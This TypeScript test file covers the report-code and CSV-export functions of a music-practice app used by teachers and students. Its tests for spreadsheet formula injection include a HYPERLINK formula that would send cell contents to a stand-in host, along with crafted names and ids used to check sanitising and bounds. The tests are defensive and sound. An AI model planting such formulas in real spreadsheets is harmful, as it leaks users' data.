// SPDX-FileCopyrightText: The Plinky Authors
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, expect, it } from "vitest";
import { type Assignment, makeAssignment } from "./assignment";
import {
    type AssignmentReport,
    buildReport,
    collectReports,
    decodeReport,
    encodeReport,
    groupReports,
    MAX_REPORT_ID_LENGTH,
    MAX_REPORT_ITEMS,
    MAX_WHO_LENGTH,
    NOT_PLAYED,
    reportLetter,
    reportsToCsv,
    reportSummary,
} from "./assignmentReport";

const assignment: Assignment = makeAssignment({
    id: "first-steps",
    name: "First steps",
    items: [{ id: "twinkle" }, { id: "ode-to-joy" }, { id: "scale-c-major" }],
});

const scores = (map: Record<string, number>) => (id: string) => map[id] ?? null;

describe("buildReport", () => {
    it("reports every step, played or not", () => {
        const report = buildReport(assignment, scores({ twinkle: 91, "ode-to-joy": 64 }), "Ada", 5);

        expect(report.items).toEqual([
            { id: "twinkle", score: 91 },
            { id: "ode-to-joy", score: 64 },
            // A list of what was done is only useful next to what was not.
            { id: "scale-c-major", score: NOT_PLAYED },
        ]);
        expect(report.who).toBe("Ada");
        expect(report.assignmentName).toBe("First steps");
    });

    it("keeps a zero apart from a piece never played", () => {
        const report = buildReport(assignment, scores({ twinkle: 0 }), "Ada", 5);

        expect(report.items[0]?.score).toBe(0);
        expect(report.items[1]?.score).toBe(NOT_PLAYED);
    });

    it("tidies the name the student typed", () => {
        expect(buildReport(assignment, scores({}), "   Ada   ", 5).who).toBe("Ada");
        expect(buildReport(assignment, scores({}), "x".repeat(200), 5).who).toHaveLength(
            MAX_WHO_LENGTH,
        );
    });

    it("refuses a score that could not have come from a run", () => {
        const report = buildReport(
            assignment,
            scores({ twinkle: 9999, "ode-to-joy": Number.NaN, "scale-c-major": -40 }),
            "Ada",
            5,
        );

        expect(report.items.map((item) => item.score)).toEqual([100, NOT_PLAYED, 0]);
    });
});

describe("the code", () => {
    it("round-trips a report", () => {
        const report = buildReport(assignment, scores({ twinkle: 91 }), "Ada Lovelace", 1_700_000);

        expect(decodeReport(encodeReport(report))).toEqual(report);
    });

    it("stays URL-safe so it survives a chat window", () => {
        const code = encodeReport(buildReport(assignment, scores({ twinkle: 91 }), "Ada", 1));

        expect(code).toMatch(/^[A-Za-z0-9_-]+$/);
    });

    it("reads a hand-edited or truncated code as nothing", () => {
        const code = encodeReport(buildReport(assignment, scores({}), "Ada", 1));

        expect(decodeReport("")).toBeNull();
        expect(decodeReport("not-a-code")).toBeNull();
        expect(decodeReport(code.slice(0, 8))).toBeNull();
    });

    it("survives surrounding whitespace from a paste", () => {
        const code = encodeReport(buildReport(assignment, scores({ twinkle: 91 }), "Ada", 1));

        expect(decodeReport(`  ${code}\n`)?.who).toBe("Ada");
    });

    it("refuses a code carrying no steps at all", () => {
        // A report about nothing tells a teacher nothing, and would render as a
        // blank row that looks like a bug.
        const empty = makeAssignment({ id: "x", name: "X", items: [] });

        expect(decodeReport(encodeReport(buildReport(empty, scores({}), "Ada", 1)))).toBeNull();
    });
});

describe("reportSummary", () => {
    it("averages only what was played", () => {
        const report = buildReport(assignment, scores({ twinkle: 90, "ode-to-joy": 70 }), "A", 1);

        expect(reportSummary(report)).toEqual({ played: 2, total: 3, average: 80 });
    });

    it("reports nothing played without dividing by zero", () => {
        expect(reportSummary(buildReport(assignment, scores({}), "A", 1))).toEqual({
            played: 0,
            total: 3,
            average: 0,
        });
    });
});

describe("reportLetter", () => {
    it("leaves an unplayed piece blank rather than failing it", () => {
        expect(reportLetter(NOT_PLAYED)).toBeNull();
        expect(reportLetter(0)).toBe("F");
        expect(reportLetter(96)).toBe("S");
    });
});

describe("collectReports", () => {
    const code = (who: string, at: number, played: Record<string, number> = { twinkle: 90 }) =>
        encodeReport(buildReport(assignment, scores(played), who, at));

    it("takes a whole class pasted in at once", () => {
        const text = `${code("Ada", 1)}\n${code("Grace", 2)}\n\n${code("Alan", 3)}`;

        expect(
            collectReports(text)
                .map((r) => r.who)
                .sort(),
        ).toEqual(["Ada", "Alan", "Grace"]);
    });

    it("ignores anything in the paste that is not a code", () => {
        const text = `here you go:\n${code("Ada", 1)}\nthanks!`;

        expect(collectReports(text)).toHaveLength(1);
    });

    it("lets a resend replace the first attempt", () => {
        const text = `${code("Ada", 1, { twinkle: 50 })}\n${code("Ada", 9, { twinkle: 95 })}`;
        const collected = collectReports(text);

        expect(collected).toHaveLength(1);
        expect(collected[0]?.items[0]?.score).toBe(95);
    });

    it("does not let a stale resend overwrite a newer one", () => {
        const text = `${code("Ada", 9, { twinkle: 95 })}\n${code("Ada", 1, { twinkle: 50 })}`;

        expect(collectReports(text)[0]?.items[0]?.score).toBe(95);
    });

    it("cannot be made to fold two students into one row", () => {
        // Both halves of the key are attacker-chosen strings off the wire, so a report
        // crafted to look like another (id, name) pair when the two are joined must
        // still count as its own row.
        const wire = (assignmentId: string, who: string) =>
            encodeReport({
                assignmentId,
                assignmentName: "W",
                who,
                items: [{ id: "twinkle", score: 90 }],
                at: 1,
            });
        for (const [id, who] of [
            ["wk1 ada", ""],
            ["wk1", "ada"],
            ["wk", "1 ada"],
            ['wk1","ada', ""],
            ["wk1\u0000ada", ""],
        ] as [string, string][]) {
            expect(collectReports(wire(id, who))).toHaveLength(1);
        }
        const all = [
            wire("wk1 ada", ""),
            wire("wk1", "ada"),
            wire("wk", "1 ada"),
            wire("wk1\u0000ada", ""),
        ].join("\n");
        // Four distinct pairs, four rows — none of them collapsed into another.
        expect(collectReports(all)).toHaveLength(4);
    });

    it("treats a name's capitalisation as the same person", () => {
        expect(collectReports(`${code("ada", 1)}\n${code("Ada", 2)}`)).toHaveLength(1);
    });

    it("keeps people apart across different assignments", () => {
        const other = makeAssignment({ id: "other", name: "Other", items: [{ id: "twinkle" }] });
        const text = `${code("Ada", 1)}\n${encodeReport(buildReport(other, scores({}), "Ada", 1))}`;

        expect(collectReports(text)).toHaveLength(2);
    });

    it("comes back empty for a paste with nothing in it", () => {
        expect(collectReports("")).toEqual([]);
        expect(collectReports("   \n  ")).toEqual([]);
    });
});

describe("reportsToCsv", () => {
    const title = (id: string) => ({ twinkle: "Twinkle", "ode-to-joy": "Ode" })[id] ?? id;

    it("lays the class out as a sheet", () => {
        const reports = [
            buildReport(assignment, scores({ twinkle: 90, "ode-to-joy": 70 }), "Ada", 1),
            buildReport(assignment, scores({ twinkle: 80 }), "Grace", 2),
        ];

        const csv = reportsToCsv(reports, title).split("\n");

        expect(csv[0]).toBe("Name,Played,Average,Twinkle,Ode,scale-c-major");
        expect(csv[1]).toBe("Ada,2/3,80,90,70,");
        expect(csv[2]).toBe("Grace,1/3,80,80,,");
    });

    it("quotes a name that would otherwise split the row", () => {
        const reports = [buildReport(assignment, scores({}), 'Lovelace, Ada "A"', 1)];

        expect(reportsToCsv(reports, title)).toContain('"Lovelace, Ada ""A"""');
    });

    it("comes back empty for no reports rather than a lone header", () => {
        expect(reportsToCsv([], title)).toBe("");
    });

    it("lines everyone up even when one report is shorter", () => {
        const short = makeAssignment({ id: "first-steps", name: "F", items: [{ id: "twinkle" }] });
        const reports: AssignmentReport[] = [
            buildReport(short, scores({ twinkle: 90 }), "Ada", 1),
            buildReport(assignment, scores({ twinkle: 80 }), "Grace", 2),
        ];

        const rows = reportsToCsv(reports, title).split("\n");

        // Columns follow the longest report, so the short row pads out rather than
        // shifting everyone's marks one piece to the left.
        expect(rows[0]?.split(",")).toHaveLength(6);
        expect(rows[1]?.split(",")).toHaveLength(6);
    });
});

describe("the sheet a teacher opens runs nothing a student wrote", () => {
    const title = (id: string) => ({ twinkle: "Twinkle", "ode-to-joy": "Ode" })[id] ?? id;

    // Every character a spreadsheet reads as the start of a formula. A report is
    // written by the device it describes and is explicitly not proof, so all of this
    // is attacker-chosen text arriving on the teacher's machine.
    const FORMULA_STARTS = ["=", "+", "-", "@", "\t", "\r"];

    // A hostile name arrives over the wire, not from buildReport — that trims, so a
    // leading tab or return can only reach the sheet through a crafted code.
    const received = (who: string): AssignmentReport =>
        decodeReport(
            encodeReport({
                assignmentId: "wk1",
                assignmentName: "W",
                who,
                items: [{ id: "twinkle", score: 90 }],
                at: 1,
            }),
        )!;

    it.each(FORMULA_STARTS)("disarms a name beginning with %j", (lead) => {
        const nameCell = reportsToCsv([received(`${lead}1+1`)], title).split("\n")[1]!;
        // Quoted, and the first character inside the quotes is the text marker — so the
        // cell is read rather than evaluated.
        expect(nameCell.startsWith(`"'${lead}`)).toBe(true);
    });

    it("carries a leading tab through the wire that buildReport would have trimmed", () => {
        expect(received("\t=1+1").who).toBe("\t=1+1");
        expect(buildReport(assignment, scores({}), "\t=1+1", 1).who).toBe("=1+1");
    });

    it("disarms the classic exfiltration payload", () => {
        const who = '=HYPERLINK("http://x.test?"&A1&B1,"Grades")';
        const row = reportsToCsv([received(who)], title).split("\n")[1]!;
        expect(row.startsWith(`"'=HYPERLINK`)).toBe(true);
        // The payload survives as readable text; it just isn't run.
        expect(row).toContain("HYPERLINK");
    });

    it("disarms a crafted piece id in the header row", () => {
        // An id that resolves to no title falls back to the id itself, so the header is
        // reachable from the wire just as the name column is.
        const crafted = makeAssignment({ id: "wk1", name: "W", items: [{ id: "=1+1" }] });
        const reports = [buildReport(crafted, scores({}), "Ada", 1)];
        const header = reportsToCsv(reports, title).split("\n")[0]!;
        expect(header).toBe(`Name,Played,Average,"'=1+1"`);
    });

    it("leaves an ordinary name exactly as it was", () => {
        const reports = [
            buildReport(assignment, scores({ twinkle: 90, "ode-to-joy": 70 }), "Ada", 1),
        ];
        expect(reportsToCsv(reports, title).split("\n")[1]).toBe("Ada,2/3,80,90,70,");
    });

    it("still escapes a name that would split the row", () => {
        const reports = [buildReport(assignment, scores({}), 'Lovelace, Ada "A"', 1)];
        expect(reportsToCsv(reports, title)).toContain('"Lovelace, Ada ""A"""');
    });

    it("guards a name that both starts a formula and carries a comma", () => {
        const reports = [buildReport(assignment, scores({}), '=1,"2"', 1)];
        expect(reportsToCsv(reports, title).split("\n")[1]!).toBe(`"'=1,""2""",0/3,0,,,`);
    });
});

describe("which assignment a report names", () => {
    const items = [{ id: "twinkle" }, { id: "ode-to-joy" }];

    it("names the origin the teacher minted, not the local filing id", () => {
        const shared = makeAssignment({ id: "week-3-2", origin: "origin-1", name: "W", items });
        expect(buildReport(shared, scores({}), "Ada", 0).assignmentId).toBe("origin-1");
    });

    it("names the local id for a set that was never shared", () => {
        const mine = makeAssignment({ id: "my-set", name: "Mine", items });
        expect(buildReport(mine, scores({}), "Ada", 0).assignmentId).toBe("my-set");
    });

    it("gives every device that was sent one link the same id, however each filed it", () => {
        // The failure this closes: the local id is a slug of the name, made unique
        // against what the device already holds — so which of two same-named sets
        // became "week-3" depended on the order each pupil opened the links, and the
        // teacher's table grouped a class by whichever order they happened to click in.
        const origin = "origin-1";
        const filings = ["week-3", "week-3-2", "week-3-3"];
        const reports = filings.map((id) =>
            buildReport(makeAssignment({ id, origin, name: "W", items }), scores({}), id, 0),
        );
        expect(new Set(reports.map((report) => report.assignmentId)).size).toBe(1);
    });
});

describe("a paste holding more than one assignment", () => {
    const piano = makeAssignment({
        origin: "piano",
        name: "Piano, week 3",
        items: [{ id: "twinkle" }, { id: "ode-to-joy" }],
    });
    const theory = makeAssignment({
        origin: "theory",
        name: "Theory, week 3",
        items: [{ id: "intervals" }],
    });
    const paste = [
        buildReport(piano, scores({ twinkle: 90, "ode-to-joy": 70 }), "Ada", 1),
        buildReport(theory, scores({ intervals: 80 }), "Ada", 2),
        buildReport(piano, scores({ twinkle: 60 }), "Bo", 3),
    ]
        .map(encodeReport)
        .join("\n");

    it("reads as one table per assignment", () => {
        const groups = groupReports(collectReports(paste));
        expect(groups.map((group) => group.assignmentName)).toEqual([
            "Piano, week 3",
            "Theory, week 3",
        ]);
        expect(groups.map((group) => group.reports.length)).toEqual([2, 1]);
    });

    it("gives each assignment its own columns", () => {
        // Read as one table, Ada's theory row would show a dash under Twinkle and Ode
        // to Joy — indistinguishable from a piece she was asked for and skipped.
        const [piano, theory] = groupReports(collectReports(paste));
        expect(piano?.columns).toEqual(["twinkle", "ode-to-joy"]);
        expect(theory?.columns).toEqual(["intervals"]);
    });

    it("keeps one person's two assignments apart", () => {
        const forAda = groupReports(collectReports(paste)).map((group) =>
            group.reports.find((report) => report.who === "Ada"),
        );
        expect(forAda.every((report) => report !== undefined)).toBe(true);
    });

    it("groups a single assignment into one table", () => {
        const one = groupReports(
            collectReports(encodeReport(buildReport(piano, scores({}), "A", 0))),
        );
        expect(one).toHaveLength(1);
    });

    it("has no groups for a paste with nothing readable in it", () => {
        expect(groupReports(collectReports("not a code at all"))).toEqual([]);
    });
});

describe("what a crafted code may not do to the table", () => {
    it("bounds the number of columns one code can ask for", () => {
        const many = makeAssignment({
            id: "big",
            name: "Big",
            items: Array.from({ length: MAX_REPORT_ITEMS + 100 }, (_, at) => ({ id: `p${at}` })),
        });
        // The assignment itself caps first, so the honest path never reaches the
        // parser's cap — both hold, which is the point.
        const decoded = decodeReport(encodeReport(buildReport(many, scores({}), "A", 0)));
        expect(decoded?.items.length).toBeLessThanOrEqual(MAX_REPORT_ITEMS);
    });

    it("bounds a column heading arriving off the wire", () => {
        // An assignment link refuses such an id, so the report is built from an assignment
        // shaped by hand: the report codec bounds it on its own, whatever produced it.
        const long: Assignment = {
            ...makeAssignment({ id: "x", name: "N", items: [{ id: "p" }] }),
            items: [{ id: "p".repeat(5000) }],
        };
        const decoded = decodeReport(encodeReport(buildReport(long, scores({}), "A", 0)));
        expect(decoded?.items[0]?.id.length).toBe(MAX_REPORT_ID_LENGTH);
    });
});
